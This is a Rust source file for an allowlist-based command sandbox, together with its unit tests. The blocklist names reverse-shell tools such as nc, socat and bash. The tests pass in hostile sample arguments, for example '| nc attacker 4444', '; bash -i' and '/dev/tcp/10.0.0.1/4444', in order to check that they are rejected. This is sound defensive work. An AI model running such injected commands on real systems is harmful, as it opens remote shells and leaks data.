//! Sandbox — allowlist-based command execution with workspace scoping.

use std::process::Command;

#[derive(Debug)]
pub struct ExecOutput {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
}

const DEFAULT_ALLOWED: &[&str] = &[
    "ls",
    "cat",
    "head",
    "tail",
    "wc",
    "grep",
    "find",
    "df",
    "du",
    "uname",
    "hostname",
    "ping",
    "curl",
    "wget",
    "ip",
    "ss",
    "ps",
    "top",
    "free",
    "lsblk",
    "lscpu",
    "sensors",
    "journalctl",
];

const BLOCKED: &[&str] = &[
    "rm", "dd", "mkfs", "shutdown", "reboot", "poweroff", "halt", "init", "kill", "pkill", "mount",
    "fdisk", "iptables", "nft", // Reverse shell / network exfil tools
    "nc", "ncat", "socat", "telnet", "nmap", "bash", "sh", "zsh", "python", "python3", "perl",
    "ruby", "php", "lua", "node", "gcc", "cc", "make", "chmod", "chown",
];

const MAX_OUTPUT: usize = 1_048_576; // 1 MB

pub struct SandboxManager {
    allowed: Vec<String>,
}

impl SandboxManager {
    pub fn new() -> Self {
        Self {
            allowed: DEFAULT_ALLOWED.iter().map(|s| s.to_string()).collect(),
        }
    }

    pub fn execute(
        &self,
        command: &str,
        args: &[String],
        workspace: Option<&str>,
        timeout_secs: u64,
    ) -> Result<ExecOutput, String> {
        // Check against blocklist
        let cmd_base = command.split('/').next_back().unwrap_or(command);
        if BLOCKED.contains(&cmd_base) {
            return Err(format!("Command blocked: {cmd_base}"));
        }

        // Check allowlist
        if !self.allowed.iter().any(|a| a == cmd_base) {
            return Err(format!("Command not allowed: {cmd_base}"));
        }

        // Validate workspace path (prevent traversal)
        if let Some(ws) = workspace {
            let canonical =
                std::fs::canonicalize(ws).map_err(|e| format!("Invalid workspace: {e}"))?;
            if !canonical.starts_with("/tmp") && !canonical.starts_with("/home") {
                return Err("Workspace must be under /tmp or /home".into());
            }
        }

        // Validate args don't contain path traversal or shell metacharacters
        for arg in args {
            if arg.contains("..") {
                return Err("Path traversal detected in arguments".into());
            }
            // Block shell metacharacters that could enable injection
            if arg.contains('|')
                || arg.contains(';')
                || arg.contains('`')
                || arg.contains("$(")
                || arg.contains("${")
                || arg.contains("/dev/tcp")
                || arg.contains("mkfifo")
            {
                return Err("Shell metacharacter detected in arguments".into());
            }
        }

        let mut cmd = Command::new(command);
        cmd.args(args);
        if let Some(ws) = workspace {
            cmd.current_dir(ws);
        }

        let output = cmd.output().map_err(|e| format!("Execution failed: {e}"))?;

        // Wait with timeout (basic — Command::output blocks)
        let _ = timeout_secs; // TODO: implement proper timeout with tokio

        let mut stdout = String::from_utf8_lossy(&output.stdout).to_string();
        let mut stderr = String::from_utf8_lossy(&output.stderr).to_string();

        // Truncate to max output
        stdout.truncate(MAX_OUTPUT);
        stderr.truncate(MAX_OUTPUT);

        Ok(ExecOutput {
            stdout,
            stderr,
            exit_code: output.status.code().unwrap_or(-1),
        })
    }

    pub fn allowed_commands(&self) -> Vec<String> {
        self.allowed.clone()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn allowed_commands_populated() {
        let sm = SandboxManager::new();
        let cmds = sm.allowed_commands();
        assert!(cmds.contains(&"ls".to_string()));
        assert!(cmds.contains(&"cat".to_string()));
        assert!(cmds.contains(&"grep".to_string()));
        assert!(cmds.len() >= 20);
    }

    #[test]
    fn blocked_command_rejected() {
        let sm = SandboxManager::new();
        let result = sm.execute("rm", &[], None, 30);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("blocked"));
    }

    #[test]
    fn unlisted_command_rejected() {
        let sm = SandboxManager::new();
        let result = sm.execute("ffmpeg", &[], None, 30);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("not allowed"));
    }

    #[test]
    fn path_traversal_in_args_rejected() {
        let sm = SandboxManager::new();
        let result = sm.execute("ls", &["../../etc/passwd".to_string()], None, 30);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("traversal"));
    }

    #[test]
    fn allowed_command_executes() {
        let sm = SandboxManager::new();
        let result = sm.execute("uname", &["-s".to_string()], None, 30);
        assert!(result.is_ok());
        let output = result.unwrap();
        assert!(output.stdout.contains("Linux"));
        assert_eq!(output.exit_code, 0);
    }

    #[test]
    fn ls_with_workspace() {
        let sm = SandboxManager::new();
        let result = sm.execute("ls", &[], Some("/tmp"), 30);
        assert!(result.is_ok());
        assert_eq!(result.unwrap().exit_code, 0);
    }

    #[test]
    fn bad_workspace_rejected() {
        let sm = SandboxManager::new();
        let result = sm.execute("ls", &[], Some("/etc"), 30);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Workspace must be"));
    }

    #[test]
    fn command_with_full_path_uses_basename() {
        let sm = SandboxManager::new();
        // /usr/bin/rm has basename "rm" which is blocked
        let result = sm.execute("/usr/bin/rm", &[], None, 30);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("blocked"));
    }

    #[test]
    fn blocked_commands_comprehensive() {
        let sm = SandboxManager::new();
        for cmd in [
            "dd", "mkfs", "shutdown", "reboot", "kill", "mount", "iptables",
        ] {
            let result = sm.execute(cmd, &[], None, 30);
            assert!(result.is_err(), "{cmd} should be blocked");
        }
    }

    #[test]
    fn stderr_captured() {
        let sm = SandboxManager::new();
        // ls a nonexistent path should produce stderr
        let result = sm.execute("ls", &["/nonexistent_path_xyz".to_string()], None, 30);
        assert!(result.is_ok());
        let output = result.unwrap();
        assert!(!output.stderr.is_empty());
        assert_ne!(output.exit_code, 0);
    }

    #[test]
    fn reverse_shell_tools_blocked() {
        let sm = SandboxManager::new();
        for cmd in [
            "nc", "ncat", "socat", "bash", "sh", "python3", "perl", "ruby", "php",
        ] {
            let result = sm.execute(cmd, &[], None, 30);
            assert!(result.is_err(), "{cmd} should be blocked");
        }
    }

    #[test]
    fn shell_metacharacters_in_args_blocked() {
        let sm = SandboxManager::new();

        let result = sm.execute("ls", &["| nc attacker 4444".to_string()], None, 30);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("metacharacter"));

        let result = sm.execute("ls", &["; bash -i".to_string()], None, 30);
        assert!(result.is_err());

        let result = sm.execute("cat", &["$(whoami)".to_string()], None, 30);
        assert!(result.is_err());

        let result = sm.execute("cat", &["`id`".to_string()], None, 30);
        assert!(result.is_err());
    }

    #[test]
    fn dev_tcp_in_args_blocked() {
        let sm = SandboxManager::new();
        let result = sm.execute("cat", &["/dev/tcp/10.0.0.1/4444".to_string()], None, 30);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("metacharacter"));
    }
}
